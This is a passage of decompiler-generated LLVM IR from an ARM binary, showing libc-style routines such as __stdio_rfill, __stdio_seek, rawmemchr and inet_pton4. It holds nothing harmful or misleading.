  %v2_1512c = icmp eq i32 %v1_1512c, 0
  %v2_15130 = add i32 %tmp, 16
  %v3_15130 = inttoptr i32 %v2_15130 to i32*
  %v4_15130 = load i32, i32* %v3_15130, align 4
  store i32 %v4_15130, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1512c, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1513c = sub i32 %v1_1513c, %v4_15130
  store i32 %v2_1513c, i32* %r3.global-to-local, align 4
  %v1_15140 = inttoptr i32 %arg2 to i32*
  %v2_15140 = load i32, i32* %v1_15140, align 4
  store i32 %v2_15140, i32* %r0.global-to-local, align 4
  %v3_15140 = add i32 %arg2, 4
  %v4_15140 = inttoptr i32 %v3_15140 to i32*
  %v5_15140 = load i32, i32* %v4_15140, align 4
  %v2_15144 = add i32 %storemerge, %v2_1513c
  store i32 %v2_15144, i32* %r4.global-to-local, align 4
  %v2_15148 = sub i32 %v2_15140, %v2_15144
  store i32 %v2_15148, i32* %r2.global-to-local, align 4
  %v2_1514c = and i32 %v2_15144, 1073741824
  %v3_1514c = icmp ne i32 %v2_1514c, 0
  %v4_1514c = ashr i32 %v2_15144, 31
  %v6_1514c = icmp eq i1 %v3_1514c, false
  %v7_1514c = sub i32 %v5_15140, %v4_1514c
  %v9_1514c = sext i1 %v6_1514c to i32
  %v10_1514c = add i32 %v7_1514c, %v9_1514c
  store i32 %v10_1514c, i32* %r3.global-to-local, align 4
  %v2_15150 = sub i32 %v10_1514c, %v5_15140
  %v4_15150 = xor i32 %v10_1514c, %v5_15140
  %v5_15150 = xor i32 %v2_15150, %v10_1514c
  %v6_15150 = and i32 %v5_15150, %v4_15150
  %v7_15150 = icmp slt i32 %v6_15150, 0
  %v8_15150 = icmp slt i32 %v2_15150, 0
  %v9_15150 = icmp eq i32 %v10_1514c, %v5_15140
  store i32 %v2_15148, i32* %v1_15140, align 4
  %v5_15154 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15154, i32* %v4_15140, align 4
  %v3_15158 = xor i1 %v8_15150, %v7_15150
  %v4_15158 = or i1 %v9_15150, %v3_15158
  br i1 %v4_15158, label %dec_label_pc_1515c, label %dec_label_pc_15168

dec_label_pc_1515c:                               ; preds = %bb13
  br i1 %v9_15150, label %dec_label_pc_15160, label %dec_label_pc_1516cthread-pre-split

dec_label_pc_15160:                               ; preds = %dec_label_pc_1515c
  %v0_15160 = load i32, i32* %r2.global-to-local, align 4
  %v1_15160 = load i32, i32* %r0.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v0_15160, %v1_15160
  br i1 %tmp17, label %dec_label_pc_15168, label %dec_label_pc_1516cthread-pre-split

dec_label_pc_15168:                               ; preds = %dec_label_pc_15160, %bb13
  %v0_15168 = load i32, i32* %r4.global-to-local, align 4
  %v1_15168 = sub i32 0, %v0_15168
  store i32 %v1_15168, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1516c

dec_label_pc_1516cthread-pre-split:               ; preds = %dec_label_pc_15160, %dec_label_pc_1515c
  %v0_1516c.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1516c

dec_label_pc_1516c:                               ; preds = %dec_label_pc_1516cthread-pre-split, %dec_label_pc_15168
  %v0_1516c = phi i32 [ %v0_1516c.pr, %dec_label_pc_1516cthread-pre-split ], [ %v1_15168, %dec_label_pc_15168 ]
  %v1_1516c = icmp slt i32 %v0_1516c, 0
  br i1 %v1_1516c, label %dec_label_pc_15174, label %dec_label_pc_15190

dec_label_pc_15174:                               ; preds = %dec_label_pc_1516c
  store i32 57312, i32* %r3.global-to-local, align 4
  %v0_15178 = call i32 @__aeabi_read_tp()
  store i32 %v0_15178, i32* %r0.global-to-local, align 4
  %v3_1517c = load i16, i16* @global_var_23164.175, align 2
  %v4_1517c = sext i16 %v3_1517c to i32
  store i32 %v4_1517c, i32* %r3.global-to-local, align 4
  store i32 75, i32* %r2.global-to-local, align 4
  %v3_15184 = add i32 %v4_1517c, %v0_15178
  %v4_15184 = inttoptr i32 %v3_15184 to i32*
  store i32 75, i32* %v4_15184, align 4
  %v0_15190.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15190

dec_label_pc_1518c:                               ; preds = %dec_label_pc_15108, %dec_label_pc_15100
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15190

dec_label_pc_15190:                               ; preds = %dec_label_pc_1516c, %dec_label_pc_15174, %dec_label_pc_1518c
  %v0_15190 = phi i32 [ %v0_1516c, %dec_label_pc_1516c ], [ %v0_15190.pre, %dec_label_pc_15174 ], [ -1, %dec_label_pc_1518c ]
  store i32 %v0_15190, i32* %r0.global-to-local, align 4
  %v2_15194 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15194, i32* @r4, align 4
  ret i32 %v0_15190

; uselistorder directives
  uselistorder i32 %v0_15190, { 1, 0 }
  uselistorder i1 %v9_15150, { 1, 0 }
  uselistorder i32 %v2_15150, { 1, 0 }
  uselistorder i32 %v10_1514c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_15140, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_15190, { 2, 1, 0 }
  uselistorder label %bb13, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_151a0 = load i32, i32* @r4, align 4
  store i32 %v3_151a0, i32* %stack_var_-8, align 4
  %v1_151a4 = add i32 %arg1, 8
  %v1_151a8 = inttoptr i32 %v1_151a4 to i32*
  %v2_151a8 = load i32, i32* %v1_151a8, align 4
  store i32 %v2_151a8, i32* @r1, align 4
  %v3_151a8 = add i32 %arg1, 12
  %v4_151a8 = inttoptr i32 %v3_151a8 to i32*
  %v5_151a8 = load i32, i32* %v4_151a8, align 4
  %v2_151ac = sub i32 %v5_151a8, %v2_151a8
  store i32 %v2_151ac, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_151b4 = inttoptr i32 %arg1 to i16*
  %v4_151b4 = call i32 @__stdio_READ(i16* %v3_151b4, i32 %v2_151a8, i32 %v2_151ac)
  %v0_151b8 = load i32, i32* @r4, align 4
  %v1_151b8 = add i32 %v0_151b8, 8
  %v2_151b8 = inttoptr i32 %v1_151b8 to i32*
  %v3_151b8 = load i32, i32* %v2_151b8, align 4
  store i32 %v3_151b8, i32* %r2.global-to-local, align 4
  %v2_151bc = add i32 %v3_151b8, %v4_151b4
  %v2_151c0 = add i32 %v0_151b8, 20
  %v3_151c0 = inttoptr i32 %v2_151c0 to i32*
  store i32 %v2_151bc, i32* %v3_151c0, align 4
  %v0_151c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_151c4 = load i32, i32* @r4, align 4
  %v2_151c4 = add i32 %v1_151c4, 16
  %v3_151c4 = inttoptr i32 %v2_151c4 to i32*
  store i32 %v0_151c4, i32* %v3_151c4, align 4
  %v2_151c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_151c8, i32* @r4, align 4
  ret i32 %v4_151b4

; uselistorder directives
  uselistorder i32 %v4_151b4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_151d0 = load i32, i32* @r4, align 4
  store i32 %v3_151d0, i32* %stack_var_-12, align 4
  %v0_151d4 = load i32, i32* @r0, align 4
  %v1_151d4 = inttoptr i32 %v0_151d4 to i16*
  %v2_151d4 = load i16, i16* %v1_151d4, align 2
  %v3_151d4 = zext i16 %v2_151d4 to i32
  store i32 %v3_151d4, i32* %r3.global-to-local, align 4
  %v0_151d8 = load i32, i32* @r1, align 4
  %v2_151d8 = and i32 %v0_151d8, %v3_151d4
  %v4_151d8 = icmp eq i32 %v2_151d8, 0
  store i32 %v0_151d4, i32* @r4, align 4
  br i1 %v4_151d8, label %dec_label_pc_151e8, label %dec_label_pc_151f8

dec_label_pc_151e8:                               ; preds = %entry
  %v1_151e8 = and i32 %v3_151d4, 2176
  %v2_151e8 = icmp eq i32 %v1_151e8, 0
  br i1 %v2_151e8, label %dec_label_pc_151f0, label %dec_label_pc_15204

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151e8
  %v2_151f0 = or i32 %v0_151d8, %v3_151d4
  store i32 %v2_151f0, i32* %r3.global-to-local, align 4
  %v1_151f4 = trunc i32 %v2_151f0 to i16
  store i16 %v1_151f4, i16* %v1_151d4, align 2
  %v0_151f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_151f8

dec_label_pc_151f8:                               ; preds = %entry, %dec_label_pc_151f0
  %v0_151f8 = phi i32 [ %v0_151d4, %entry ], [ %v0_151f8.pre, %dec_label_pc_151f0 ]
  %v1_151f8 = inttoptr i32 %v0_151f8 to i16*
  %v2_151f8 = load i16, i16* %v1_151f8, align 2
  %v3_151f8 = zext i16 %v2_151f8 to i32
  store i32 %v3_151f8, i32* %r3.global-to-local, align 4
  %v1_151fc = and i32 %v3_151f8, 16
  store i32 %v1_151fc, i32* %r5.global-to-local, align 4
  %v2_151fc = icmp eq i32 %v1_151fc, 0
  br i1 %v2_151fc, label %dec_label_pc_1522c, label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_151e8, %dec_label_pc_151f8
  store i32 57168, i32* %r3.global-to-local, align 4
  %v0_15208 = call i32 @__aeabi_read_tp()
  store i32 %v0_15208, i32* %r0.global-to-local, align 4
  %v3_1520c = load i16, i16* @global_var_23164.175, align 2
  %v4_1520c = sext i16 %v3_1520c to i32
  store i32 %v4_1520c, i32* %r3.global-to-local, align 4
  %v3_15214 = add i32 %v4_1520c, %v0_15208
  %v4_15214 = inttoptr i32 %v3_15214 to i32*
  store i32 9, i32* %v4_15214, align 4
  br label %dec_label_pc_15218

dec_label_pc_15218:                               ; preds = %dec_label_pc_15234, %dec_label_pc_15204
  %v0_15218 = load i32, i32* @r4, align 4
  %v1_15218 = inttoptr i32 %v0_15218 to i16*
  %v2_15218 = load i16, i16* %v1_15218, align 2
  %v3_15218 = zext i16 %v2_15218 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15220 = or i32 %v3_15218, 8
  store i32 %v1_15220, i32* %r3.global-to-local, align 4
  %v1_15224 = trunc i32 %v1_15220 to i16
  store i16 %v1_15224, i16* %v1_15218, align 2
  %v1_1526c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15264

dec_label_pc_1522c:                               ; preds = %dec_label_pc_151f8
  %v1_1522c = and i32 %v3_151f8, 64
  %v2_1522c = icmp eq i32 %v1_1522c, 0
  br i1 %v2_1522c, label %dec_label_pc_15254, label %dec_label_pc_15234

dec_label_pc_15234:                               ; preds = %dec_label_pc_1522c
  %v0_15234 = call i32 @__stdio_wcommit()
  store i32 %v0_15234, i32* %r0.global-to-local, align 4
  %v2_15238 = icmp eq i32 %v0_15234, 0
  br i1 %v2_15238, label %dec_label_pc_15240, label %dec_label_pc_15218

dec_label_pc_15240:                               ; preds = %dec_label_pc_15234
  %v0_15240 = load i32, i32* @r4, align 4
  %v1_15240 = inttoptr i32 %v0_15240 to i16*
  %v2_15240 = load i16, i16* %v1_15240, align 2
  %v3_15240 = zext i16 %v2_15240 to i32
  store i32 %v3_15240, i32* %r3.global-to-local, align 4
  %v1_15244 = add i32 %v0_15240, 8
  %v2_15244 = inttoptr i32 %v1_15244 to i32*
  %v3_15244 = load i32, i32* %v2_15244, align 4
  %v1_15248 = and i32 %v3_15240, 65471
  store i32 %v1_15248, i32* %r3.global-to-local, align 4
  %v2_1524c = add i32 %v0_15240, 28
  %v3_1524c = inttoptr i32 %v2_1524c to i32*
  store i32 %v3_15244, i32* %v3_1524c, align 4
  %v0_15250 = load i32, i32* %r3.global-to-local, align 4
  %v1_15250 = trunc i32 %v0_15250 to i16
  %v2_15250 = load i32, i32* @r4, align 4
  %v3_15250 = inttoptr i32 %v2_15250 to i16*
  store i16 %v1_15250, i16* %v3_15250, align 2
  %v0_15254.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15254

dec_label_pc_15254:                               ; preds = %dec_label_pc_1522c, %dec_label_pc_15240
  %v2_1525c = phi i32 [ %v0_151f8, %dec_label_pc_1522c ], [ %v0_15254.pre, %dec_label_pc_15240 ]
  %v1_15254 = inttoptr i32 %v2_1525c to i16*
  %v2_15254 = load i16, i16* %v1_15254, align 2
  %v3_15254 = zext i16 %v2_15254 to i32
  %v1_15258 = or i32 %v3_15254, 1
  store i32 %v1_15258, i32* %r3.global-to-local, align 4
  %v1_1525c = trunc i32 %v1_15258 to i16
  store i16 %v1_1525c, i16* %v1_15254, align 2
  %v0_15260 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15260, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15264

dec_label_pc_15264:                               ; preds = %dec_label_pc_15218, %dec_label_pc_15254
  %v1_1526c = phi i32 [ %v1_1526c.pre, %dec_label_pc_15218 ], [ %v0_15260, %dec_label_pc_15254 ]
  %v2_15268 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15268, i32* @r4, align 4
  ret i32 %v1_1526c

; uselistorder directives
  uselistorder i32 %v3_151d4, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_15264, { 1, 0 }
  uselistorder label %dec_label_pc_15254, { 1, 0 }
  uselistorder label %dec_label_pc_15204, { 1, 0 }
  uselistorder label %dec_label_pc_151f8, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_15280 = load i32, i32* %arg2, align 4
  %v3_15280 = add i32 %tmp, 4
  %v4_15280 = inttoptr i32 %v3_15280 to i32*
  %v5_15280 = load i32, i32* %v4_15280, align 4
  %v1_15284 = add i32 %arg1, 4
  %v2_15284 = inttoptr i32 %v1_15284 to i32*
  %v3_15284 = load i32, i32* %v2_15284, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1528c = call i32 @__GI_lseek64(i32 %v3_15284, i32 %tmp, i32 %v2_15280, i32 %v5_15280)
  %v1_15290 = icmp slt i32* %arg2, null
  br i1 %v1_15290, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_152985 = load i32, i32* @r4, align 4
  %v4_152986 = inttoptr i32 %v3_152985 to i32*
  store i32 %v4_1528c, i32* %v4_152986, align 4
  %v6_152987 = add i32 %v3_152985, 4
  %v7_152988 = inttoptr i32 %v6_152987 to i32*
  store i32 %tmp, i32* %v7_152988, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1528c, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_152b4 = urem i32 %arg1, 256
  %v0_152cc2 = load i32, i32* @r0, align 4
  %v1_152cc3 = urem i32 %v0_152cc2, 4
  %v2_152cc4 = icmp eq i32 %v1_152cc3, 0
  br i1 %v2_152cc4, label %dec_label_pc_152d4, label %dec_label_pc_152bc

dec_label_pc_152bc:                               ; preds = %entry, %dec_label_pc_152c8
  %v0_152c8 = phi i32 [ %v1_152c8, %dec_label_pc_152c8 ], [ %v0_152cc2, %entry ]
  %v1_152bc = inttoptr i32 %v0_152c8 to i8*
  %v2_152bc = load i8, i8* %v1_152bc, align 1
  %v3_152bc = zext i8 %v2_152bc to i32
  %v9_152c0 = icmp eq i32 %v3_152bc, %v1_152b4
  br i1 %v9_152c0, label %dec_label_pc_15350, label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152bc
  %v1_152c8 = add i32 %v0_152c8, 1
  %v1_152cc = urem i32 %v1_152c8, 4
  %v2_152cc = icmp eq i32 %v1_152cc, 0
  br i1 %v2_152cc, label %dec_label_pc_152d4, label %dec_label_pc_152bc

dec_label_pc_152d4:                               ; preds = %dec_label_pc_152c8, %entry
  %v0_152d8 = phi i32 [ %v0_152cc2, %entry ], [ %v1_152c8, %dec_label_pc_152c8 ]
  %v4_152d4 = mul nuw nsw i32 %v1_152b4, 256
  %v5_152d4 = or i32 %v4_152d4, %v1_152b4
  %v4_152dc = mul i32 %v5_152d4, 65536
  %v5_152dc = or i32 %v4_152dc, %v5_152d4
  br label %dec_label_pc_152e0

dec_label_pc_152e0:                               ; preds = %dec_label_pc_15340, %dec_label_pc_152e0, %dec_label_pc_152d4
  %v0_15324 = phi i32 [ %v0_152d8, %dec_label_pc_152d4 ], [ %v4_152e0, %dec_label_pc_152e0 ], [ %v4_152e0, %dec_label_pc_15340 ]
  %v1_152e0 = inttoptr i32 %v0_15324 to i32*
  %v2_152e0 = load i32, i32* %v1_152e0, align 4
  %v4_152e0 = add i32 %v0_15324, 4
  %v2_152e8 = xor i32 %v2_152e0, %v5_152dc
  %v2_152ec = add i32 %v2_152e8, 2130640639
  %v1_152f4 = sub i32 -1, %v2_152e8
  %v2_152f8 = xor i32 %v2_152ec, %v1_152f4
  %v2_152fc = and i32 %v2_152f8, -2130640640
  %v2_15300 = icmp eq i32 %v2_152fc, 0
  br i1 %v2_15300, label %dec_label_pc_152e0, label %dec_label_pc_15308

dec_label_pc_15308:                               ; preds = %dec_label_pc_152e0
  %v2_15308 = inttoptr i32 %v0_15324 to i8*
  %v3_15308 = load i8, i8* %v2_15308, align 1
  %v4_15308 = zext i8 %v3_15308 to i32
  %v9_15310 = icmp eq i32 %v4_15308, %v1_152b4
  %v1_15314 = add i32 %v0_15324, 3
  br i1 %v9_15310, label %dec_label_pc_15350, label %dec_label_pc_1531c

dec_label_pc_1531c:                               ; preds = %dec_label_pc_15308
  %v1_1531c = add i32 %v0_15324, 1
  %v2_1531c = inttoptr i32 %v1_1531c to i8*
  %v3_1531c = load i8, i8* %v2_1531c, align 1
  %v4_1531c = zext i8 %v3_1531c to i32
  %v9_15320 = icmp eq i32 %v4_1531c, %v1_152b4
  br i1 %v9_15320, label %bb, label %dec_label_pc_15330

bb:                                               ; preds = %dec_label_pc_1531c
  br label %dec_label_pc_15350

dec_label_pc_15330:                               ; preds = %dec_label_pc_1531c
  %v1_15330 = add i32 %v0_15324, 2
  %v2_15330 = inttoptr i32 %v1_15330 to i8*
  %v3_15330 = load i8, i8* %v2_15330, align 1
  %v4_15330 = zext i8 %v3_15330 to i32
  %v9_15334 = icmp eq i32 %v4_15330, %v1_152b4
  br i1 %v9_15334, label %dec_label_pc_15350, label %dec_label_pc_15340

dec_label_pc_15340:                               ; preds = %dec_label_pc_15330
  %v2_15340 = inttoptr i32 %v1_15314 to i8*
  %v3_15340 = load i8, i8* %v2_15340, align 1
  %v4_15340 = zext i8 %v3_15340 to i32
  %v9_15344 = icmp eq i32 %v4_15340, %v1_152b4
  br i1 %v9_15344, label %dec_label_pc_1534c, label %dec_label_pc_152e0

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15340
  br label %dec_label_pc_15350

dec_label_pc_15350:                               ; preds = %dec_label_pc_152bc, %dec_label_pc_15330, %dec_label_pc_15308, %bb, %dec_label_pc_1534c
  %v1_15354 = phi i32 [ %v1_15314, %dec_label_pc_1534c ], [ %v1_1531c, %bb ], [ %v1_15330, %dec_label_pc_15330 ], [ %v0_15324, %dec_label_pc_15308 ], [ %v0_152c8, %dec_label_pc_152bc ]
  ret i32 %v1_15354

; uselistorder directives
  uselistorder i32 %v4_152e0, { 1, 0 }
  uselistorder i32 %v0_15324, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_152d4, { 1, 0 }
  uselistorder i32 %v1_152c8, { 1, 0, 2 }
  uselistorder i32 %v0_152cc2, { 2, 1, 0 }
  uselistorder i32 %v1_152b4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 2130640639, { 6, 2, 7, 3, 8, 9, 4, 0, 10, 5, 1 }
  uselistorder label %dec_label_pc_15350, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_152bc, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15360 = load i32, i32* @r4, align 4
  %v6_15360 = load i32, i32* @r5, align 4
  %v15_15360 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_15378 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15378, i32* @r1, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_153f01 = load i32, i32* @r0, align 4
  %v1_153f02 = inttoptr i32 %v0_153f01 to i8*
  %v2_153f03 = load i8, i8* %v1_153f02, align 1
  %v3_153f04 = zext i8 %v2_153f03 to i32
  store i32 %v3_153f04, i32* @r3, align 4
  %v2_153f45 = icmp eq i8 %v2_153f03, 0
  store i1 %v2_153f45, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153f45, label %dec_label_pc_15400, label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %entry, %dec_label_pc_153f0.backedge
  %v0_15394 = phi i32 [ %v0_153f0, %dec_label_pc_153f0.backedge ], [ %v0_153f01, %entry ]
  %v0_153cc = phi i32 [ %v3_153f0, %dec_label_pc_153f0.backedge ], [ %v3_153f04, %entry ]
  %v2_153a0.in = phi i32 [ %v3_153f0, %dec_label_pc_153f0.backedge ], [ %v3_153f04, %entry ]
  %v2_153a0 = add nsw i32 %v2_153a0.in, -48
  %v2_15390 = icmp ugt i32 %v2_153a0, 8
  %v7_15390 = icmp eq i32 %v2_153a0, 9
  store i1 %v7_15390, i1* %cpsr_z.global-to-local, align 1
  %v1_15394 = add i32 %v0_15394, 1
  store i32 %v1_15394, i32* %r0.global-to-local, align 4
  %v2_15398 = xor i1 %v7_15390, true
  %v3_15398 = and i1 %v2_15390, %v2_15398
  br i1 %v3_15398, label %dec_label_pc_153cc, label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %dec_label_pc_15390
  %v0_1539c = load i32, i32* @r1, align 4
  %v1_1539c = inttoptr i32 %v0_1539c to i8*
  %v2_1539c = load i8, i8* %v1_1539c, align 1
  %v3_1539c = zext i8 %v2_1539c to i32
  %v0_153a0 = load i32, i32* %r7.global-to-local, align 4
  %v3_153a0 = mul i32 %v0_153a0, %v3_1539c
  %v4_153a0 = add i32 %v3_153a0, %v2_153a0
  store i32 %v4_153a0, i32* @r3, align 4
  %v2_153a4 = icmp ugt i32 %v4_153a0, 254
  %v7_153a4 = icmp eq i32 %v4_153a0, 255
  store i1 %v7_153a4, i1* %cpsr_z.global-to-local, align 1
  %v2_153a8 = xor i1 %v7_153a4, true
  %v3_153a8 = and i1 %v2_153a4, %v2_153a8
  br i1 %v3_153a8, label %dec_label_pc_15424, label %dec_label_pc_153ac

dec_label_pc_153ac:                               ; preds = %dec_label_pc_1539c
  %v0_153ac = load i32, i32* @lr, align 4
  %v2_153ac = icmp eq i32 %v0_153ac, 0
  store i1 %v2_153ac, i1* %cpsr_z.global-to-local, align 1
  %v1_153b0 = trunc i32 %v4_153a0 to i8
  store i8 %v1_153b0, i8* %v1_1539c, align 1
  %v0_153b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_153b4, label %dec_label_pc_153b8, label %dec_label_pc_153f0.backedge

dec_label_pc_153b8:                               ; preds = %dec_label_pc_153ac
  %v0_153b8 = load i32, i32* @ip, align 4
  %v1_153b8 = add i32 %v0_153b8, 1
  store i32 %v1_153b8, i32* @ip, align 4
  %v7_153bc = icmp eq i32 %v1_153b8, 4
  store i1 %v7_153bc, i1* %cpsr_z.global-to-local, align 1
  %v0_153c0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_153c0, i32* @lr, align 4
  %v8_153c4 = icmp sgt i32 %v1_153b8, 4
  br i1 %v8_153c4, label %dec_label_pc_15424, label %dec_label_pc_153f0.backedge

dec_label_pc_153cc:                               ; preds = %dec_label_pc_15390
  %v7_153cc = icmp eq i32 %v0_153cc, 46
  %v1_153d4 = load i32, i32* @lr, align 4
  %v2_153d4 = urem i32 %v1_153d4, 2
  %storemerge12 = select i1 %v7_153cc, i32 %v2_153d4, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_153d8 = icmp eq i32 %storemerge12, 0
  store i1 %v2_153d8, i1* %cpsr_z.global-to-local, align 1
  %v0_153dc = load i32, i32* @r5, align 4
  store i32 %v0_153dc, i32* @lr, align 4
  br i1 %v2_153d8, label %dec_label_pc_15424, label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153cc
  %v0_153e4 = load i32, i32* @ip, align 4
  %v7_153e4 = icmp eq i32 %v0_153e4, 4
  store i1 %v7_153e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_153e4, label %dec_label_pc_15424, label %dec_label_pc_153ec

dec_label_pc_153ec:                               ; preds = %dec_label_pc_153e4
  %v1_153ec = trunc i32 %v0_153dc to i8
  %v2_153ec = load i32, i32* @r1, align 4
  %v3_153ec = add i32 %v2_153ec, 1
  %v4_153ec = inttoptr i32 %v3_153ec to i8*
  store i8 %v1_153ec, i8* %v4_153ec, align 1
  %v5_153ec = load i32, i32* @r1, align 4
  %v6_153ec = add i32 %v5_153ec, 1
  store i32 %v6_153ec, i32* @r1, align 4
  br label %dec_label_pc_153f0.backedge

dec_label_pc_153f0.backedge:                      ; preds = %dec_label_pc_153ec, %dec_label_pc_153ac, %dec_label_pc_153b8
  %v0_153f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_153f0 = inttoptr i32 %v0_153f0 to i8*
  %v2_153f0 = load i8, i8* %v1_153f0, align 1
  %v3_153f0 = zext i8 %v2_153f0 to i32
  store i32 %v3_153f0, i32* @r3, align 4
  %v2_153f4 = icmp eq i8 %v2_153f0, 0
  store i1 %v2_153f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153f4, label %dec_label_pc_153f0.dec_label_pc_15400_crit_edge, label %dec_label_pc_15390

dec_label_pc_153f0.dec_label_pc_15400_crit_edge:  ; preds = %dec_label_pc_153f0.backedge
  %v0_15400.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15400

dec_label_pc_15400:                               ; preds = %dec_label_pc_153f0.dec_label_pc_15400_crit_edge, %entry
  %v0_15400 = phi i32 [ %v0_15400.pre, %dec_label_pc_153f0.dec_label_pc_15400_crit_edge ], [ 0, %entry ]
  %v7_15400 = icmp eq i32 %v0_15400, 3
  store i1 %v7_15400, i1* %cpsr_z.global-to-local, align 1
  %v7_15404 = icmp slt i32 %v0_15400, 4
  br i1 %v7_15404, label %dec_label_pc_15424, label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %dec_label_pc_15400
  %v0_15408 = load i32, i32* @r4, align 4
  store i32 %v0_15408, i32* @r0, align 4
  store i32 %v2_15378, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_15414 = call i32 @memcpy()
  br label %dec_label_pc_15424

dec_label_pc_15424:                               ; preds = %dec_label_pc_1539c, %dec_label_pc_153b8, %dec_label_pc_153cc, %dec_label_pc_153e4, %dec_label_pc_15400, %dec_label_pc_15408
  %storemerge = phi i32 [ 1, %dec_label_pc_15408 ], [ 0, %dec_label_pc_15400 ], [ 0, %dec_label_pc_153e4 ], [ 0, %dec_label_pc_153cc ], [ 0, %dec_label_pc_153b8 ], [ 0, %dec_label_pc_1539c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_15360, i32* @r4, align 4
  store i32 %v6_15360, i32* @r5, align 4
  store i32 %v15_15360, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_15400, { 1, 0 }
  uselistorder i32 %v3_153f0, { 2, 1, 0 }
  uselistorder i32 %v0_153f0, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_153a0, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
